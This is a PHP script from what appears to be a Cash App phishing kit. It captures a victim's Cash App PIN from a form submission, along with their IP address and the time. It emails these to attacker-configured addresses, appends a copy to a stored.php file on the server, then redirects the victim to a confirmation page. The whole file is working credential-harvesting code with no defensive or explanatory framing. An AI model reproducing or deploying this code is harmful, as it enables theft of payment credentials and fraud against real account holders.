<?php
 error_reporting(0);
  include ('config.php');
  include ('detect.php');
$ip = $_SERVER['REMOTE_ADDR'];
$InfoDATE   = date("d-m-Y h:i:sa");
$yahya_email .= '<html><head></head>
<body>
<style>
font {font-family: "Comic Sans MS", cursive, sans-serif;},
</style>
<div style="font-size: 13px;font-family:monospace;font-weight:700;">
[<font style="color: #0070ba;">PIN CA💲HAPP</font>]
<br>
<font style="color:#9c0000;"></font> [CASHAPP PIN] = <font >'.$_POST['SsZ'].'</font>
<br>
<font>[System]</font> <br>
<font style="color:#9c0000;"></font> [IP INFO] = <font>
<a target="_blank" style="text-decoration:none;" href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'"> '.$_SERVER['REMOTE_ADDR'].' </a></font><br>
<font style="color:#9c0000;"></font> [TIME/DATE] = <font >'.$InfoDATE.'</font><br>
[<font style="color: #FF0000;">THANKS TO MAGUZ</font>]
 <font style="color: #820000;"></font></div><font>
</font>
</body></html>';
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "✅ CA💲HAPP PIN [".$_SERVER['REMOTE_ADDR']." | ".$_SESSION['country1']." ] 💘 "; 
$headers .= "From: CA💲HAPP™" . "\r\n";
mail($send,$subject,$yahya_email,$headers);
mail($D, $subject, $yahya_email , $headers);

	$save=fopen("../stored.php","a+");
	fwrite($save,$yahya_email);
	fclose($save);

 header("location: ../confirm.php"); 

	 
?>